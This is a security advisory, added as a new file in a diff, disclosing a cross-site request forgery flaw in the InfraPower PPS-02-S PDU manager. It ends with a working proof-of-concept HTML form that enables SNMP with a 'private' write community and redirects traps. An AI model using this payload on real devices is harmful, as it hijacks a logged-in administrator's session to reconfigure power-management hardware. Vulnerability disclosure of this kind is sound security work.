@@ -1,0 +1,53 @@
+InfraPower PPS-02-S Q213V1 Cross-Site Request Forgery
+
+
+Vendor: Austin Hughes Electronics Ltd.
+Product web page: http://www.austin-hughes.com
+Affected version: Q213V1 (Firmware: V2395S)
+
+Summary: InfraPower Manager PPS-02-S is a FREE built-in GUI of each
+IP dongle ( IPD-02-S only ) to remotely monitor the connected PDUs.
+Patented IP Dongle provides IP remote access to the PDUs by a true
+network IP address chain. Only 1xIP dongle allows access to max. 16
+PDUs in daisy chain - which is a highly efficient cient application
+for saving not only the IP remote accessories cost, but also the true
+IP addresses required on the PDU management.
+
+Desc: The application interface allows users to perform certain actions
+via HTTP requests without performing any validity checks to verify the
+requests. This can be exploited to perform certain actions with admin
+privileges if a logged-in user visits a malicious web site.
+
+Tested on: Linux 2.6.28 (armv5tel)
+           lighttpd/1.4.30-devel-1321
+           PHP/5.3.9
+           SQLite/3.7.10
+
+
+Vulnerabiliy discovered by Gjoko 'LiquidWorm' Krstic
+                           @zeroscience
+
+
+Advisory ID: ZSL-2016-5375
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5375.php
+
+
+27.09.2016
+
+--
+
+
+PoC:
+
+<html>
+  <body>
+    <form action="http://192.168.0.17/SNMP.php?Menu=SMP" method="POST">
+      <input type="hidden" name="SNMPAgent" value="Enable" />
+      <input type="hidden" name="CommuintyString" value="public" />
+      <input type="hidden" name="CommuintyWrite" value="private" />
+      <input type="hidden" name="TrapsVersion" value="v2Trap" />
+      <input type="hidden" name="IP" value="192&#46;168&#46;0&#46;254" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
